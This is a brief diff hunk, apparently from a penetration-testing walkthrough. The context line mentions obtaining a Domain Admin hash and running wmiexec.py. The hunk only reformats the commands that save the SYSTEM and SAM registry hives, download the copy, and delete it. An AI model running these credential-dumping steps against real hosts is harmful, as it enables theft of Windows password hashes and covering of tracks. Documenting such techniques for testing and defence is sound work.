@@ -32,9 +32,9 @@ which should get you Domain Admin hash. After you have that, wmiexec.py to the t
 
 and do
 
-`reg save HKLM\SYSTEM system.save`  
-`get system.save`  
-`del /f system.save`  
+`reg save HKLM\SYSTEM system.save\
+get system.save\
+del /f system.save\`
 
 
 `reg save HKLM\SAM sam.save`  
